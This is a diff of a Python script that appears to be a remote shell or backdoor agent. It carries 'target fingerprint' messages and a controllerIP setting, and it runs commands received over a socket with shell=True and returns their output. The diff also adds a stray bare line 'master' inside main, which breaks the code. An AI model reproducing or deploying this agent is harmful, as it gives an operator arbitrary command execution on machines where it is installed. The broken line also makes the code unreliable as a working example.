@@ -22,7 +22,7 @@ def get_ip():
         IP = s.getsockname()[0]
     except Exception:
         print('target fingerprint failed')
-        IP = '127.0.0.1'
+        IP = '0.0.0.0'
     finally:
         s.close()
     return IP
@@ -31,6 +31,7 @@ def get_ip():
 ###############################################################Main
 def main(*args):
     controllerIP = ''
+    master
     password = ''
 
     if password == '':
@@ -79,9 +80,9 @@ def main(*args):
                     process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
                     stdout, stderr = process.communicate()
                     print('sending back """\n' + stdout.decode("utf-8"), stderr.decode("utf-8"), '"""\n\n')
-                    if stderr != b'':
+                    if stderr:
                         conn.sendall(stderr)
-                    elif stdout != b'':
+                    elif stdout:
                         conn.sendall(stdout)
                     else:
                         conn.sendall(b'The command completed successfully with no output')
